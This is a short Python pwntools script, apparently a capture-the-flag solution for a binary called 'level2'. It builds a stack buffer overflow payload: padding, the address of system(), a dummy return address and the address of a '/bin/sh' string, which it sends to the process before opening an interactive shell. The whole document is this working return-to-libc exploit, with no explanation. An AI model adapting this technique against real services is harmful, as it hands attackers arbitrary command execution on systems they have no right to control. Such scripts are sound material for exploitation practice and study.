from pwn import *

elf = ELF('./level2')
sys_addr = elf.symbols['system']
sh_addr = next(elf.search(b'/bin/sh'))

payload = cyclic(0x88 + 0x4) + p32(sys_addr) + p32(0xdeadbeef) + p32(sh_addr)

io = process('./level2')
io.sendlineafter(b"Input:\n", payload)

io.interactive()
